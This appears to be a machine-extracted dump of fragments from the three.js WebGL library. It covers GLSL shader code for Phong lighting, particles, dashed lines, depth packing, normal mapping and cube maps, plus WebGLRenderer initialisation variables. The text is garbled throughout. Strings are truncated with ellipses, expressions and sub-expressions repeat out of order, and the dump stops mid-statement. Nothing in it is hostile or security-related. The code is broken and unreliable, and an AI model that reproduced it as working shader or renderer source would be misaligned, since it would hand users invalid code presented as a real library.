"\t\tif ( ... cing )"		if ( gl_FrontFacing )"\t\t\tgl_ ... Front;"			gl_FragColor.xyz *= vLightFront;			gl_FragColor= vLightFront;"\t\telse"		else"\t\t\tgl_ ... tBack;"			gl_FragColor.xyz *= vLightBack;= vLightBack;"\t\tgl_F ... Front;"		gl_FragColor.xyz *= vLightFront;'phong' ... )\r\n\r\n\t}THREE.U ... bump" ]THREE.U ... lmap" ]"specul ... 111 ) }{ type: ... 111 ) }value:  ... 11111 )"shinin ... e: 30 }{ type: ... e: 30 }value: 30#define PHONG"\tvNorm ... mal );"	vNormal = normalize( transformedNormal );	vNormal = normalize"\tvView ... n.xyz;"	vViewPosition = -mvPosition.xyz;	vViewPosition = -mvPosition"unifor ... cular;"uniform vec3 specular;"unifor ... iness;"uniform float shininess;"lights ... agment""bumpma ... agment""normal ... agment"'partic ... )\r\n\r\n\t}particle_basicTHREE.U ... icle" ]"unifor ...  size;"uniform float size;"unifor ... scale;"uniform float scale;	vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );	vec4 mvPosition = modelViewMatrix"\t#ifde ... UATION"	#ifdef USE_SIZEATTENUATION"\t\tgl_P ... z ) );"		gl_PointSize = size * ( scale / length( mvPosition.xyz ) );		gl_PointSize = size( scale / length( mvPosition.xyz ) ) scale / length( mvPosition.xyz )  scale / length( mvPosition.xyz ) mvPosition.xyz  mvPosition"\t\tgl_P ...  size;"		gl_PointSize = size;"\tgl_Po ... ition;"	gl_Position = projectionMatrix * mvPosition;	gl_Position = projectionMatrixuniform vec3 psColor;"map_pa ... agment"	gl_FragColor = vec4( psColor, opacity );( psColor, opacity ) psColor, opacity 'dashed ... )\r\n\r\n\t}dashed"scale" ... ue: 1 }"dashSi ... ue: 1 }"totalS ... ue: 2 }{ type: ... ue: 2 }value: 2"attrib ... tance;"attribute float lineDistance;"varyin ... tance;"varying float vLineDistance;"\tvLine ... tance;"	vLineDistance = scale * lineDistance;	vLineDistance = scale lineDistance;"unifor ... hSize;"uniform float dashSize;"unifor ... lSize;"uniform float totalSize;"\tif (  ... ze ) {"	if ( mod( vLineDistance, totalSize ) > dashSize ) {"\t\tdiscard;"		discard;'depth' ... )\r\n\r\n\t}uniform ... \r\n\r\n\t\t}"mNear" ... : 1.0 }"mFar"  ... 000.0 }{ type: ... 000.0 }value: 2000.0"unifor ... mNear;"uniform float mNear;"unifor ...  mFar;"uniform float mFar;"\tfloat ... pth );"	float color = 1.0 - smoothstep( mNear, mFar, depth );	float color = 10 - smoothstep( mNear, mFar, depth ) mNear, mFar, depth 	gl_FragColor = vec4( vec3( color ), opacity );( vec3( color ), opacity ) vec3( color ), opacity ( color ) color 'normal ... )\r\n\r\n\t}	vNormal = normalize( normalMatrix * normal );( normalMatrix * normal ) normalMatrix * normal  normalMatrix normal 	gl_FragColor = vec4( 0.5 * normalize( vNormal ) + 0.5, opacity );( 0.5 * normalize( vNormal ) + 0.5, opacity ) 0.5 * normalize( vNormal ) + 0.5, opacity  normalize5, opacity "enable ... ue: 0 }"tDispl ...  null }"tCube" ...  null }"tNorma ...  null }"tSpecu ...  null }"tAO"\t\t ...  null }"uNorma ... , 1 ) }"uDispl ... : 0.0 }{ type: ... : 0.0 }value: 0.0"uDispl ... : 1.0 }"diffus ... fff ) }"opacit ... ue: 1 }"reflec ... : 0.5 }{ type: ... : 0.5 }value: 0.5"uOffse ... , 0 ) }uOffset{ type: ... , 0 ) }value:  ...  0, 0 )"uRepea ... , 1 ) }uRepeatuniform bool enableDiffuse;uniform bool enableSpecular;"unifor ... bleAO;"uniform bool enableAO;"unifor ... ction;"uniform bool enableReflection;"unifor ... ormal;"uniform sampler2D tNormal;uniform sampler2D tSpecular;"unifor ... D tAO;"uniform sampler2D tAO;"unifor ... tCube;"uniform samplerCube tCube;"unifor ... Scale;"uniform vec2 uNormalScale;"unifor ... fract;"uniform bool useRefract;"unifor ... Ratio;"uniform float refractionRatio;"unifor ... ivity;"uniform float reflectivity;"varyin ... ngent;"varying vec3 vTangent;varying vec3 vBinormal;varying vec3 vWorldPosition;	vec3 specularTex = vec3( 1.0 );	vec3 specularTex = vec3"\tvec3  ... - 1.0;"	vec3 normalTex = texture2D( tNormal, vUv ).xyz * 2.0 - 1.0;	vec3 normalTex = texture2D( tNormal, vUv ) tNormal, vUv "\tnorma ... Scale;"	normalTex.xy *= uNormalScale;	normalTex= uNormalScale;"\tnorma ... Tex );"	normalTex = normalize( normalTex );	normalTex = normalize( normalTex ) normalTex "\tif( e ... se ) {"	if( enableDiffuse ) {"\t\t#ifd ... _INPUT"		#ifdef GAMMA_INPUT"\t\t\tvec ... vUv );"			vec4 texelColor = texture2D( tDiffuse, vUv );			vec4 texelColor = texture2D"\t\t\ttex ... r.xyz;"			texelColor.xyz *= texelColor.xyz;			texelColor"\t\t\tgl_ ... Color;"			gl_FragColor = gl_FragColor * texelColor;			gl_FragColor = gl_FragColor"\t\t\tgl_ ... vUv );"			gl_FragColor = gl_FragColor * texture2D( tDiffuse, vUv );"\tif( enableAO ) {"	if( enableAO ) {			vec4 aoColor = texture2D( tAO, vUv );			vec4 aoColor = texture2D( tAO, vUv ) tAO, vUv "\t\t\taoC ... r.xyz;"			aoColor.xyz *= aoColor.xyz;			aoColor= aoColor"\t\t\tgl_ ... r.xyz;"			gl_FragColor.xyz = gl_FragColor.xyz * aoColor.xyz; aoColor"\t\t\tgl_ ... ).xyz;"			gl_FragColor.xyz = gl_FragColor.xyz * texture2D( tAO, vUv ).xyz;"\tif( e ... ular )"	if( enableSpecular )	if( enableSpecular ) enableSpecular "\t\tspec ... ).xyz;"		specularTex = texture2D( tSpecular, vUv ).xyz;		specularTex = texture2D( tSpecular, vUv ) tSpecular, vUv "\tmat3  ... l ) );"	mat3 tsb = mat3( normalize( vTangent ), normalize( vBinormal ), normalize( vNormal ) );	mat3 tsb = mat3( normalize( vTangent ), normalize( vBinormal ), normalize( vNormal ) ) normalize( vTangent ), normalize( vBinormal ), normalize( vNormal ) ( vTangent ) vTangent ( vBinormal ) vBinormal "\tvec3  ... alTex;"	vec3 finalNormal = tsb * normalTex;	vec3 finalNormal = tsb normalTex;"\t#ifdef FLIP_SIDED"	#ifdef FLIP_SIDED"\t\tfina ... ormal;"		finalNormal = -finalNormal;"\tvec3  ... mal );"	vec3 normal = normalize( finalNormal );	vec3 normal = normalize( finalNormal ) finalNormal 	vec3 viewPosition = normalize( vViewPosition );	vec3 viewPosition = normalize"\t#if M ... TS > 0"	#if MAX_POINT_LIGHTS > 0"\t\tvec3 ... 0.0 );"		vec3 pointDiffuse = vec3( 0.0 );		vec3 pointDiffuse = vec3		vec3 pointSpecular = vec3( 0.0 );		vec3 pointSpecular = vec3"\t\tfor  ... ++ ) {"		for ( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {"\t\t\tvec ... 1.0 );"			vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );			vec4 lPosition = viewMatrix"\t\t\tvec ... n.xyz;"			vec3 pointVector = lPosition.xyz + vViewPosition.xyz;			vec3 pointVector = lPosition			float pointDistance = 1.0;			float pointDistance = 1			if ( pointLightDistance[ i ] > 0.0 )"\t\t\t\tpo ... 1.0 );"				pointDistance = 1.0 - min( ( length( pointVector ) / pointLightDistance[ i ] ), 1.0 );				pointDistance = 1( ( length( pointVector ) / pointLightDistance[ i ] ), 1.0 ) ( length( pointVector ) / pointLightDistance[ i ] ), 1.0 ( length( pointVector ) / pointLightDistance[ i ] ) length( pointVector ) / pointLightDistance[ i ] ( pointVector ) pointVector "\t\t\tpoi ... tor );"			pointVector = normalize( pointVector );			pointVector = normalize				float pointDiffuseWeightFull = max( dot( normal, pointVector ), 0.0 );				float pointDiffuseWeightFull = max( dot( normal, pointVector ), 0.0 ) dot( normal, pointVector ), 0.0 ( normal, pointVector ) normal, pointVector 				float pointDiffuseWeightHalf = max( 0.5 * dot( normal, pointVector ) + 0.5, 0.0 );				float pointDiffuseWeightHalf = max( 0.5 * dot( normal, pointVector ) + 0.5, 0.0 ) 0.5 * dot( normal, pointVector ) + 0.5, 0.0 				vec3 pointDiffuseWeight = mix( vec3( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB );				vec3 pointDiffuseWeight = mix				float pointDiffuseWeight = max( dot( normal, pointVector ), 0.0 );				float pointDiffuseWeight = max"\t\t\tpoi ... eight;"			pointDiffuse += pointDistance * pointLightColor[ i ] * diffuse * pointDiffuseWeight;			pointDiffuse= pointDistance pointDiffuseWeight;			vec3 pointHalfVector = normalize( pointVector + viewPosition );			vec3 pointHalfVector = normalize( pointVector + viewPosition ) pointVector + viewPosition  pointVector			float pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 );			float pointDotNormalHalf = max			float pointSpecularWeight = specularTex.r * max( pow( pointDotNormalHalf, shininess ), 0.0 );			float pointSpecularWeight = specularTex			vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( pointVector, pointHalfVector ), 5.0 );( 1.0 - dot( pointVector, pointHalfVector ), 5.0 ) 1.0 - dot( pointVector, pointHalfVector ), 5.0 ( pointVector, pointHalfVector ) pointVector, pointHalfVector "\t\t\tpoi ... ation;"			pointSpecular += schlick * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * pointDistance * specularNormalization;			pointSpecular pointDistance	#if MAX_SPOT_LIGHTS > 0		vec3 spotDiffuse = vec3( 0.0 );		vec3 spotDiffuse = vec3		vec3 spotSpecular = vec3( 0.0 );		vec3 spotSpecular = vec3		for ( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {			vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );			vec3 spotVector = lPosition.xyz + vViewPosition.xyz;			vec3 spotVector = lPosition			float spotDistance = 1.0;			float spotDistance = 1"\t\t\t\tsp ... 1.0 );"				spotDistance = 1.0 - min( ( length( spotVector ) / spotLightDistance[ i ] ), 1.0 );				spotDistance = 1( ( length( spotVector ) / spotLightDistance[ i ] ), 1.0 ) ( length( spotVector ) / spotLightDistance[ i ] ), 1.0 ( length( spotVector ) / spotLightDistance[ i ] ) length( spotVector ) / spotLightDistance[ i ] ( spotVector ) spotVector "\t\t\tspo ... tor );"			spotVector = normalize( spotVector );			spotVector = normalize"\t\t\tflo ... n ) );"			float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) );			float spotEffect = dot"\t\t\tif  ...  ] ) {"			if ( spotEffect > spotLightAngleCos[ i ] ) {"\t\t\t\tsp ... 0.0 );"				spotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );				spotEffect = max"\t\t\t\t\tf ... 0.0 );"					float spotDiffuseWeightFull = max( dot( normal, spotVector ), 0.0 );					float spotDiffuseWeightFull = max( dot( normal, spotVector ), 0.0 ) dot( normal, spotVector ), 0.0 ( normal, spotVector ) normal, spotVector 					float spotDiffuseWeightHalf = max( 0.5 * dot( normal, spotVector ) + 0.5, 0.0 );					float spotDiffuseWeightHalf = max( 0.5 * dot( normal, spotVector ) + 0.5, 0.0 ) 0.5 * dot( normal, spotVector ) + 0.5, 0.0 "\t\t\t\t\tv ... RGB );"					vec3 spotDiffuseWeight = mix( vec3( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB );					vec3 spotDiffuseWeight = mix"\t\t\t\t#else"				#else					float spotDiffuseWeight = max( dot( normal, spotVector ), 0.0 );					float spotDiffuseWeight = max"\t\t\t\tsp ... ffect;"				spotDiffuse += spotDistance * spotLightColor[ i ] * diffuse * spotDiffuseWeight * spotEffect;				spotDiffuse= spotDistance"\t\t\t\tve ... ion );"				vec3 spotHalfVector = normalize( spotVector + viewPosition );				vec3 spotHalfVector = normalize( spotVector + viewPosition ) spotVector + viewPosition  spotVector				float spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 );				float spotDotNormalHalf = max				float spotSpecularWeight = specularTex.r * max( pow( spotDotNormalHalf, shininess ), 0.0 );				float spotSpecularWeight = specularTex"\t\t\t\tfl ... / 8.0;"				float specularNormalization = ( shininess + 2.0001 ) / 8.0;				float specularNormalization = "\t\t\t\tve ... 5.0 );"				vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( spotVector, spotHalfVector ), 5.0 );				vec3 schlick = specular( 1.0 - dot( spotVector, spotHalfVector ), 5.0 ) 1.0 - dot( spotVector, spotHalfVector ), 5.0 ( spotVector, spotHalfVector ) spotVector, spotHalfVector 				spotSpecular += schlick * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * spotDistance * specularNormalization * spotEffect;				spotSpecular spotDistance"\t\t\t}"			}	#if MAX_DIR_LIGHTS > 0		vec3 dirDiffuse = vec3( 0.0 );		vec3 dirDiffuse = vec3		vec3 dirSpecular = vec3( 0.0 );		vec3 dirSpecular = vec3"\t\tfor( ... ++ ) {"		for( int i = 0; i < MAX_DIR_LIGHTS; i++ ) {"\t\t\tvec ... 0.0 );"			vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );			vec4 lDirection = viewMatrix"\t\t\tvec ... xyz );"			vec3 dirVector = normalize( lDirection.xyz );			vec3 dirVector = normalize				float directionalLightWeightingFull = max( dot( normal, dirVector ), 0.0 );				float directionalLightWeightingFull = max( dot( normal, dirVector ), 0.0 ) dot( normal, dirVector ), 0.0 				float directionalLightWeightingHalf = max( 0.5 * dot( normal, dirVector ) + 0.5, 0.0 );				float directionalLightWeightingHalf = max( 0.5 * dot( normal, dirVector ) + 0.5, 0.0 ) 0.5 * dot( normal, dirVector ) + 0.5, 0.0 				vec3 dirDiffuseWeight = mix( vec3( directionalLightWeightingFull ), vec3( directionalLightWeightingHalf ), wrapRGB );				vec3 dirDiffuseWeight = mix( vec3( directionalLightWeightingFull ), vec3( directionalLightWeightingHalf ), wrapRGB ) vec3( directionalLightWeightingFull ), vec3( directionalLightWeightingHalf ), wrapRGB ( directionalLightWeightingFull ) directionalLightWeightingFull ( directionalLightWeightingHalf ) directionalLightWeightingHalf 				float dirDiffuseWeight = max( dot( normal, dirVector ), 0.0 );				float dirDiffuseWeight = max"\t\t\tdir ... eight;"			dirDiffuse += directionalLightColor[ i ] * diffuse * dirDiffuseWeight;			dirDiffuse			vec3 dirHalfVector = normalize( dirVector + viewPosition );			vec3 dirHalfVector = normalize			float dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 );			float dirDotNormalHalf = max			float dirSpecularWeight = specularTex.r * max( pow( dirDotNormalHalf, shininess ), 0.0 );			float dirSpecularWeight = specularTex			vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( dirVector, dirHalfVector ), 5.0 );( 1.0 - dot( dirVector, dirHalfVector ), 5.0 ) 1.0 - dot( dirVector, dirHalfVector ), 5.0 "\t\t\tdir ... ation;"			dirSpecular += schlick * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization;			dirSpecular	#if MAX_HEMI_LIGHTS > 0		vec3 hemiDiffuse  = vec3( 0.0 );		vec3 hemiDiffuse  = vec3		vec3 hemiSpecular = vec3( 0.0 );		vec3 hemiSpecular = vec3		for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {			vec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );			vec3 lVector = normalize( lDirection.xyz );			vec3 lVector = normalize"\t\t\tflo ... + 0.5;"			float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;			float hemiDiffuseWeight = 0"\t\t\tvec ... ght );"			vec3 hemiColor = mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );			vec3 hemiColor = mix"\t\t\them ... Color;"			hemiDiffuse += diffuse * hemiColor;			hemiDiffuse			vec3 hemiHalfVectorSky = normalize( lVector + viewPosition );			vec3 hemiHalfVectorSky = normalize			float hemiDotNormalHalfSky = 0.5 * dot( normal, hemiHalfVectorSky ) + 0.5;			float hemiDotNormalHalfSky = 0			float hemiSpecularWeightSky = specularTex.r * max( pow( hemiDotNormalHalfSky, shininess ), 0.0 );			float hemiSpecularWeightSky = specularTex"\t\t\tvec ... ector;"			vec3 lVectorGround = -lVector;			vec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition );			vec3 hemiHalfVectorGround = normalize			float hemiDotNormalHalfGround = 0.5 * dot( normal, hemiHalfVectorGround ) + 0.5;			float hemiDotNormalHalfGround = 0			float hemiSpecularWeightGround = specularTex.r * max( pow( hemiDotNormalHalfGround, shininess ), 0.0 );			float hemiSpecularWeightGround = specularTex"\t\t\tflo ... und );"			float dotProductGround = dot( normal, lVectorGround );			float dotProductGround = dot			vec3 schlickSky = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, hemiHalfVectorSky ), 5.0 );			vec3 schlickSky = specular( 1.0 - dot( lVector, hemiHalfVectorSky ), 5.0 ) 1.0 - dot( lVector, hemiHalfVectorSky ), 5.0 			vec3 schlickGround = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 5.0 );			vec3 schlickGround = specular( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 5.0 ) 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 5.0 "\t\t\them ... 0 ) );"			hemiSpecular += hemiColor * specularNormalization * ( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) );			hemiSpecular	vec3 totalDiffuse = vec3( 0.0 );	vec3 totalDiffuse = vec3	vec3 totalSpecular = vec3( 0.0 );	vec3 totalSpecular = vec3"\t\ttota ... ffuse;"		totalDiffuse += dirDiffuse;		totalDiffuse"\t\ttota ... cular;"		totalSpecular += dirSpecular;		totalSpecular		totalDiffuse += hemiDiffuse;		totalSpecular += hemiSpecular;		totalDiffuse += pointDiffuse;		totalSpecular += pointSpecular;		totalDiffuse += spotDiffuse;		totalSpecular += spotSpecular;"\t#ifdef METAL"	#ifdef METAL"\t\tgl_F ... lar );"		gl_FragColor.xyz = gl_FragColor.xyz * ( totalDiffuse + ambientLightColor * ambient + totalSpecular );( totalDiffuse + ambientLightColor * ambient + totalSpecular ) totalDiffuse + ambientLightColor * ambient + totalSpecular "\t\tgl_F ... cular;"		gl_FragColor.xyz = gl_FragColor.xyz * ( totalDiffuse + ambientLightColor * ambient ) + totalSpecular;( totalDiffuse + ambientLightColor * ambient ) totalDiffuse + ambientLightColor * ambient "\tif (  ... on ) {"	if ( enableReflection ) {"\t\tvec3 vReflect;"		vec3 vReflect;"\t\t\tvRe ... tio );"			vReflect = refract( cameraToVertex, normal, refractionRatio );			vReflect = refract( cameraToVertex, normal, refractionRatio ) cameraToVertex, normal, refractionRatio "\t\t} else {"		} else {"\t\t\tvRe ... mal );"			vReflect = reflect( cameraToVertex, normal );			vReflect = reflect( cameraToVertex, normal ) cameraToVertex, normal 		vec4 cubeColor = textureCube( tCube, vec3( -vReflect.x, vReflect.yz ) );( tCube, vec3( -vReflect.x, vReflect.yz ) ) tCube, vec3( -vReflect.x, vReflect.yz )  tCube, vec3( -vReflect.x, vReflect.yz ) -vReflect.x, vReflect.yz  -vReflectx, vReflect"\t\t\tcub ... r.xyz;"			cubeColor.xyz *= cubeColor.xyz;			cubeColor		gl_FragColor.xyz = mix( gl_FragColor.xyz, cubeColor.xyz, specularTex.r * reflectivity );( gl_FragColor.xyz, cubeColor.xyz, specularTex.r * reflectivity ) gl_FragColor.xyz, cubeColor.xyz, specularTex.r * reflectivity xyz, specularTex"attrib ... ngent;"attribute vec4 tangent;"unifor ... ffset;"uniform vec2 uOffset;"unifor ... epeat;"uniform vec2 uRepeat;"unifor ... ement;"uniform bool enableDisplacement;"#ifdef ... XTURES"#ifdef VERTEX_TEXTURES"\tunifo ... ement;"	uniform sampler2D tDisplacement;	uniform float uDisplacementScale;"\tunifo ... tBias;"	uniform float uDisplacementBias;"\t\tvNor ... xyz );"		vNormal = normalize( normalMatrix * skinnedNormal.xyz );		vNormal = normalize( normalMatrix * skinnedNormal.xyz ) normalMatrix * skinnedNormal.xyz  skinnedNormal		vec4 skinnedTangent = skinMatrix * vec4( tangent.xyz, 0.0 );		vec4 skinnedTangent = skinMatrix( tangent.xyz, 0.0 ) tangent.xyz, 0.0  tangentxyz, 0"\t\tvTan ... xyz );"		vTangent = normalize( normalMatrix * skinnedTangent.xyz );		vTangent = normalize( normalMatrix * skinnedTangent.xyz ) normalMatrix * skinnedTangent.xyz  skinnedTangent"\t\tvNor ... mal );"		vNormal = normalize( normalMatrix * normal );		vTangent = normalize( normalMatrix * tangent.xyz );( normalMatrix * tangent.xyz ) normalMatrix * tangent.xyz "\tvBino ... t.w );"	vBinormal = normalize( cross( vNormal, vTangent ) * tangent.w );	vBinormal = normalize( cross( vNormal, vTangent ) * tangent.w ) cross( vNormal, vTangent ) * tangent.w ( vNormal, vTangent ) vNormal, vTangent "\tvUv = ... ffset;"	vUv = uv * uRepeat + uOffset; uRepeat uOffset;"\tvec3  ... ition;"	vec3 displacedPosition;"\t#ifde ... XTURES"	#ifdef VERTEX_TEXTURES"\t\tif ( ... nt ) {"		if ( enableDisplacement ) {"\t\t\tvec ... ).xyz;"			vec3 dv = texture2D( tDisplacement, uv ).xyz;			vec3 dv = texture2D( tDisplacement, uv ) tDisplacement, uv "\t\t\tflo ... tBias;"			float df = uDisplacementScale * dv.x + uDisplacementBias;			float df = uDisplacementScale dv uDisplacementBias;"\t\t\tdis ...  * df;"			displacedPosition = position + normalize( normal ) * df;			displacedPosition = position( normal ) df;"\t\t\t#if ... INNING"			#ifdef USE_SKINNING"\t\t\t\tve ... 1.0 );"				vec4 skinVertex = vec4( position, 1.0 );				vec4 skinVertex = vec4"\t\t\t\tve ... ght.x;"				vec4 skinned  = boneMatX * skinVertex * skinWeight.x;				vec4 skinned  = boneMatX"\t\t\t\tsk ... ght.y;"				skinned 	  += boneMatY * skinVertex * skinWeight.y;				skinned 	 "\t\t\t\tsk ... ght.z;"				skinned 	  += boneMatZ * skinVertex * skinWeight.z;"\t\t\t\tsk ... ght.w;"				skinned 	  += boneMatW * skinVertex * skinWeight.w;"\t\t\t\tdi ... d.xyz;"				displacedPosition  = skinned.xyz;				displacedPosition  = skinned"\t\t\t\tdi ... ition;"				displacedPosition = position;"\t\t#ifd ... INNING"		#ifdef USE_SKINNING			vec4 skinVertex = vec4( position, 1.0 );			vec4 skinVertex = vec4"\t\t\tvec ... ght.x;"			vec4 skinned  = boneMatX * skinVertex * skinWeight.x;			vec4 skinned  = boneMatX"\t\t\tski ... ght.y;"			skinned 	  += boneMatY * skinVertex * skinWeight.y;			skinned 	 "\t\t\tski ... ght.z;"			skinned 	  += boneMatZ * skinVertex * skinWeight.z;"\t\t\tski ... ght.w;"			skinned 	  += boneMatW * skinVertex * skinWeight.w;"\t\t\tdis ... d.xyz;"			displacedPosition  = skinned.xyz;			displacedPosition  = skinned"\t\t\tdis ... ition;"			displacedPosition = position;	vec4 mvPosition = modelViewMatrix * vec4( displacedPosition, 1.0 );( displacedPosition, 1.0 ) displacedPosition, 1.0  displacedPosition, 1	vec4 worldPosition = modelMatrix * vec4( displacedPosition, 1.0 );	vec4 worldPosition = modelMatrix"\t#ifde ... DOWMAP"	#ifdef USE_SHADOWMAP		for( int i = 0; i < MAX_SHADOWS; i ++ ) {"\t\t\tvSh ... ition;"			vShadowCoord[ i ] = shadowMatrix[ i ] * worldPosition;			vShadowCoord'cube': ... )\r\n\r\n\t}uniform ...  -1 } }{ "tCub ...  -1 } }"tFlip" ... e: -1 }tFlip	vec4 worldPosition = modelMatrix * vec4( position, 1.0 );"\tgl_Po ... 1.0 );"	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );"unifor ... tFlip;"uniform float tFlip;"\tgl_Fr ... z ) );"	gl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );	gl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) ) tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) ( tFlip * vWorldPosition.x, vWorldPosition.yz ) tFlip * vWorldPosition.x, vWorldPosition.yz  tFlip vWorldPositionx, vWorldPosition'depthR ... )\r\n\r\n\t}depthRGBAuniforms: {}"vec4 p ... th ) {"vec4 pack_depth( const in float depth ) {"\tconst ... 1.0 );"	const vec4 bit_shift = vec4( 256.0 * 256.0 * 256.0, 256.0 * 256.0, 256.0, 1.0 );	const vec4 bit_shift = vec4( 256.0 * 256.0 * 256.0, 256.0 * 256.0, 256.0, 1.0 ) 256.0 * 256.0 * 256.0, 256.0 * 256.0, 256.0, 1.0 0, 256"\tconst ... 6.0 );"	const vec4 bit_mask  = vec4( 0.0, 1.0 / 256.0, 1.0 / 256.0, 1.0 / 256.0 );	const vec4 bit_mask  = vec4( 0.0, 1.0 / 256.0, 1.0 / 256.0, 1.0 / 256.0 ) 0.0, 1.0 / 256.0, 1.0 / 256.0, 1.0 / 256.0 "\tvec4  ... 255 );"	vec4 res = mod( depth * bit_shift * vec4( 255 ), vec4( 256 ) ) / vec4( 255 );	vec4 res = mod( depth * bit_shift * vec4( 255 ), vec4( 256 ) ) depth * bit_shift * vec4( 255 ), vec4( 256 )  bit_shift( 255 ) 255 , vec4( 256 ) 256  / vec4"\tres - ... _mask;"	res -= res.xxyz * bit_mask;	res -= resxxyz bit_mask;"\treturn res;"	return res;"\t\tgl_F ... EXT );"		gl_FragData[ 0 ] = pack_depth( gl_FragDepthEXT );		gl_FragData = pack_depth( gl_FragDepthEXT ) gl_FragDepthEXT "\t\tgl_F ... d.z );"		gl_FragData[ 0 ] = pack_depth( gl_FragCoord.z );( gl_FragCoord.z ) gl_FragCoord.z  gl_FragCoordTHREE.W ... ;\r\n\r\n};THREE.W ... );\r\n\r\n}THREE.WebGLRenderervar _ca ... ha = 0;_contex ...  : nullparamet ...  : nullparameters.context_precis ... 'highp'paramet ... 'highp'parameters.precisionhighp_buffers = {}_alpha  ... : falseparamet ... : false_depth  ...  : trueparamet ...  : trueparameters.depth_stenci ...  : trueparameters.stencil_antial ... : falseparameters.antialias_premul ...  : trueparamet ... edAlpha_preser ... : false_preser ... gBufferparamet ... gBuffer_logari ... : false_logari ... hBufferparamet ... hBufferlogarit ... hBufferthis.context = null;this.context = nullthis.contextthis.autoClearColorthis.autoClearDepththis.au ... Stencilthis.au ... Objectsthis.ga ...  false;this.ga ... = falsethis.gammaInputthis.gammaOutputthis.sh ... = true;this.sh ...  = truethis.sh ... oUpdatethis.sh ... dowMap;this.sh ... adowMapthis.shadowMapTypethis.sh ... eFront;this.sh ... ceFrontthis.sh ... ullFacethis.shadowMapDebugthis.sh ... Cascadethis.ma ... ts = 8;this.ma ... ets = 8this.maxMorphTargetsthis.ma ... ls = 4;this.ma ... als = 4this.maxMorphNormalsthis.au ... ubemapsthis.re ... e = [];this.re ... re = []this.re ... ginsPrethis.re ... t = [];this.re ... st = []this.re ... insPostmemory: ... \r\n\r\n\t\t}programs: 0geometries: 0textures: 0calls: 0points: 0var _th ... \r\n\r\n\t};_programs = []_curren ...  = null_curren ... Id = -1_curren ... oupHash_usedTe ... its = 0_oldDoubleSided = -1_oldFlipSided = -1_oldBlending = -1_oldBle ... on = -1_oldBlendSrc = -1_oldBlendDst = -1_oldDepthTest = -1_oldDepthWrite = -1_oldPol ...  = null_oldPol ... tFactor_oldPol ... etUnits_oldLineWidth = null_viewportX = 0_viewportY = 0_viewpo ... s.width_viewpo ... .height_currentWidth = 0_currentHeight = 0_newAtt ... y( 16 )new Uint8Array( 16 )_enable ... y( 16 )_projSc ... trix4()_direct ... ctor3()_lights ...  = true_lights ... }\r\n\r\n\t}ambient: [ 0, 0, 0 ]directi ... ray() }{ lengt ... ray() }length: 0colors: new Array()new Array()positio ... Array()point:  ... ray() }distanc ... Array()spot: { ... ray() }directi ... Array()anglesC ... Array()exponen ... Array()hemi: { ... ray() }skyColo ... Array()groundC ... Array()var _gl;var _gl ... eFloat;_glExte ... reFloatvar _gl ... Linear;_glExte ... tLinearvar _gl ... atives;_glExte ... vativesvar _gl ... tropic;_glExte ... otropicvar _gl ... reS3TC;_glExte ... ureS3TCvar _gl ... exUint;_glExte ... dexUintvar _gl ... gDepth;_glExte ... agDepthinitGL();initGL()setDefaultGLState();setDefaultGLState()this.context = _gl;this.context = _glvar _ma ... NITS );_maxTex ... UNITS )_gl.get ... UNITS )_gl.getParameter_gl.MAX ... E_UNITS_maxVer ... UNITS )var _ma ... SIZE );_maxTex ... _SIZE )_gl.get ... _SIZE )_gl.MAX_TEXTURE_SIZE_maxCub ... _SIZE )_gl.MAX ... RE_SIZEvar _ma ...  ) : 0;_maxAni ... T ) : 0_glExte ... T ) : 0_gl.get ... Y_EXT )_glExte ... OPY_EXTvar _su ...  > 0 );_suppor ... s > 0 )_suppor ... extures( _maxV ... s > 0 )_maxVer ... res > 0var _su ... eFloat;_suppor ... reFloatvar _co ... ) : [];_compre ...  ) : []_compre ... Formats_glExte ...  ) : []_gl.get ... RMATS )_gl.COM ... FORMATSvar _ve ... LOAT );_vertex ... FLOAT )_vertex ... hpFloat_gl.get ... FLOAT )_gl.get ... nFormat_gl.VERTEX_SHADER_gl.HIGH_FLOAT_vertex ... mpFloat_gl.MEDIUM_FLOAT_vertex ... wpFloat_gl.LOW_FLOATvar _fr ... LOAT );_fragme ... FLOAT )_fragme ... hpFloat_gl.FRAGMENT_SHADER_fragme ... mpFloat_fragme ... wpFloatvar hig ... on > 0;highpAv ... ion > 0_vertex ... ion > 0_vertex ... ecision_fragme ... ion > 0_fragme ... ecisionvar med ... on > 0;mediump ... ion > 0if 